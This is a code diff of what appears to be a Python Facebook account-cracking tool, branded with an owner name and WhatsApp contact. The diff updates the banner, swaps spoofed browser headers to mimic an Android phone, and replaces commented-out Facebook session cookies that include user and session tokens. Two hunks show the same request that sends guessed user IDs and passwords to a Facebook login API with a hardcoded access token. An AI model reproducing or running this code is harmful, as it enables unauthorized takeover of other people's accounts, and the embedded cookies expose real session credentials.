@@ -390,12 +390,12 @@ def follow(ses,coki):
 logo = ("""\033[1;32m
        
 
-██╗░░██╗░█████╗
-██╔═   ██╗██║░░██
+██╗      ██╗   █████╗
+██╔═   ██╗██║     ██
 ███████║███████
 ██╔══██║██╔══██
-██║░░██║██║░░██
-╚═╝░░╚═╝╚═╝░░╚═\033
+██║      ██║██║     ██
+╚═╝  ╚═╝╚═╝    ╚═\033
 __________________×______________________
   
   Owner   :  Mafia Rayess
@@ -404,9 +404,9 @@ __________________×______________________
 
   Facebook : Pashto Danger Mafia
   
-  WhatsApp : 93783361438
+  WhatsApp : +93783361438
   
-  tool update : Done
+  tool update : 5.9
 __________________×______________________\033[1;37m""")
 
 class Main:
@@ -870,23 +870,23 @@ class Main:
     'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
-    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; dpr=3.43505597114563; wl_cbv=v2%3Bclient_version%3A2458%3Btimestamp%3A1712483490; locale=en_US; m_pixel_ratio=3.7835533618927; c_user=100000268365288; xs=15%3ASsI3jPC7rUqd0Q%3A2%3A1712606969%3A-1%3A-1; fr=0ULMFGIF7cmGl1dcS.AWWz3_q-pBkH9dLjkmcHr2R1WRo.BmFC2j..AAA.0.0.BmFE77.AWW9kuX09pw; m_page_voice=100000268365288; wd=712x1308; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcmVmPWRibCZwYWlwdj0wJmVhdj1BZmFxNlluZ1J2Sy1ic3BCT05SNFo5X0xTRGJnU2dGVldsY3VvcW16aU5HdUxYclZGcFREZHQ1M09wbkM2bzFWaGxJIiwiaCI6Ii9ib29rbWFya3MvP3JlZj1kYmwmcGFpcHY9MCZlYXY9QWZhcTZZbmdSdkstYnNwQk9OUjRaOV9MU0RiZ1NnRlZXbGN1b3FtemlOR3VMWHJWRnBURGR0NTNPcG5DNm8xVmhsSSIsInMiOiJtIn0%3D',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=wIAUZkfNZci5jRYJIygKSgKM; sb=wIAUZkUmq2yI1hEMHk_9KhiX; m_pixel_ratio=3.43505597114563; ps_l=0; ps_n=0; locale=en_US; wl_cbv=v2%3Bclient_version%3A2462%3Btimestamp%3A1712640548; vpd=v1%3B578x314x3.43505597114563; fr=01GdEBRbmJIThFc9O.AWX89l1HOjqHkAxshBw9dZg8nQg.BmFIDA..AAA.0.0.BmFNJG.AWX5KCv86_g; wd=315x578',
     'dpr': '2.75',
-    'referer': 'https://m.facebook.com/bookmarks/?ref=dbl&paipv=0&eav=Afaq6YngRvK-bspBONR4Z9_LSDbgSgFVWlcuoqmziNGuLXrVFpTDdt53OpnC6o1VhlI',
+    'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=Afc1aDiSFfkQ-ls0e8sB9iDMkbjgm-eE2sIpzzPIFco3SEmmNXvH48kyzhp2R9-ft9fDnOlP-_x-38imTdsxYfh-WvE2-bxGCKmSsrRU-1Egzg&smuh=59846&lh=Ac-gW-mnWiOJaUZdsi0&wtsid=rdr_0zgjEGpMeIDzUGYvu&_rdr',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Mi Note 10 Lite"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"12.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
-    'service-worker-navigation-preload': '{"r":1012615515,"y":"m"}',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
 }
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
@@ -1310,23 +1310,23 @@ class Main:
     'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
-    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; dpr=3.43505597114563; wl_cbv=v2%3Bclient_version%3A2458%3Btimestamp%3A1712483490; locale=en_US; m_pixel_ratio=3.7835533618927; c_user=100000268365288; xs=15%3ASsI3jPC7rUqd0Q%3A2%3A1712606969%3A-1%3A-1; fr=0ULMFGIF7cmGl1dcS.AWWz3_q-pBkH9dLjkmcHr2R1WRo.BmFC2j..AAA.0.0.BmFE77.AWW9kuX09pw; m_page_voice=100000268365288; wd=712x1308; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcmVmPWRibCZwYWlwdj0wJmVhdj1BZmFxNlluZ1J2Sy1ic3BCT05SNFo5X0xTRGJnU2dGVldsY3VvcW16aU5HdUxYclZGcFREZHQ1M09wbkM2bzFWaGxJIiwiaCI6Ii9ib29rbWFya3MvP3JlZj1kYmwmcGFpcHY9MCZlYXY9QWZhcTZZbmdSdkstYnNwQk9OUjRaOV9MU0RiZ1NnRlZXbGN1b3FtemlOR3VMWHJWRnBURGR0NTNPcG5DNm8xVmhsSSIsInMiOiJtIn0%3D',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=wIAUZkfNZci5jRYJIygKSgKM; sb=wIAUZkUmq2yI1hEMHk_9KhiX; m_pixel_ratio=3.43505597114563; ps_l=0; ps_n=0; locale=en_US; wl_cbv=v2%3Bclient_version%3A2462%3Btimestamp%3A1712640548; vpd=v1%3B578x314x3.43505597114563; fr=01GdEBRbmJIThFc9O.AWX89l1HOjqHkAxshBw9dZg8nQg.BmFIDA..AAA.0.0.BmFNJG.AWX5KCv86_g; wd=315x578',
     'dpr': '2.75',
-    'referer': 'https://m.facebook.com/bookmarks/?ref=dbl&paipv=0&eav=Afaq6YngRvK-bspBONR4Z9_LSDbgSgFVWlcuoqmziNGuLXrVFpTDdt53OpnC6o1VhlI',
+    'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=Afc1aDiSFfkQ-ls0e8sB9iDMkbjgm-eE2sIpzzPIFco3SEmmNXvH48kyzhp2R9-ft9fDnOlP-_x-38imTdsxYfh-WvE2-bxGCKmSsrRU-1Egzg&smuh=59846&lh=Ac-gW-mnWiOJaUZdsi0&wtsid=rdr_0zgjEGpMeIDzUGYvu&_rdr',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
     'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Mi Note 10 Lite"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"12.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
-    'service-worker-navigation-preload': '{"r":1012615515,"y":"m"}',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
 }
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
